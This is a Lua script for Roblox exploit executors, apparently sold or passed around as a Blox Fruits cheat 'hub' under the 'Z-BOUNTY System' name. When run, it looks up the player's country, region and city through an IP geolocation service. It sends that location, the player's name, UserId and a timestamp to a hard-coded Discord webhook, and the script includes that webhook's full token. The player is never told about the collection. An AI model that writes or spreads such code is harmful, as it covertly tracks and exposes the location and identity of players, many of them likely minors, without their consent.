local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- URL de tu Webhook (Verificada)
local WebhookURL = "https://discord.com/api/webhooks/1504207975068471378/qdu00zlhcH1lEEl84Gl2JMZKtN8DF6ltGr8BtqXh-Too6POWtlJ8SDJRylHZDTaG6VsZ"

-- Función para obtener datos de ubicación de forma segura
local function getIpData()
    local success, response = pcall(function()
        return HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json/"))
    end)
    if success and response then
        return response
    else
        return {country = "Desconocido", regionName = "Desconocido", city = "Desconocido"}
    end
end

local ipData = getIpData()

-- Identificar el Mar en Blox Fruits (Basado en PlaceId)
local function getSea()
    local id = game.PlaceId
    if id == 2753915549 then return "Primer Mar"
    elseif id == 4442245229 then return "Segundo Mar"
    elseif id == 7449925065 then return "Tercer Mar"
    else return "Mar Desconocido" end
end

-- Estructura visual para que sea idéntico a la foto 1000008396.jpg
local payload = {
    ["embeds"] = {{
        ["title"] = "🚀 HUB ACTIVADO",
        ["color"] = 65280, -- Verde
        ["fields"] = {
            {["name"] = "👤 Jugador", ["value"] = player.Name, ["inline"] = false},
            {["name"] = "🆔 UserId", ["value"] = tostring(player.UserId), ["inline"] = false},
            {["name"] = "⏰ Hora", ["value"] = os.date("%Y-%m-%d %H:%M:%S"), ["inline"] = false},
            {["name"] = "🌍 País", ["value"] = ipData.country, ["inline"] = false},
            {["name"] = "📍 Región", ["value"] = ipData.regionName, ["inline"] = false},
            {["name"] = "🏙️ Ciudad", ["value"] = ipData.city, ["inline"] = false},
            {["name"] = "🎮 Juego", ["value"] = "Blox Fruits | " .. getSea(), ["inline"] = false}
        },
        ["footer"] = {["text"] = "Z-BOUNTY System 🔥"}
    }}
}

-- Función de envío compatible con la mayoría de ejecutores
local function send(url, content)
    local request = (syn and syn.request) or (http and http.request) or http_request or request
    if request then
        local success, result = pcall(function()
            return request({
                Url = url,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(content)
            })
        end)
        if not success then
            warn("Error crítico al enviar al Webhook: " .. tostring(result))
        end
    else
        warn("Tu ejecutor no soporta la función 'request'.")
    end
end

send(WebhookURL, payload)

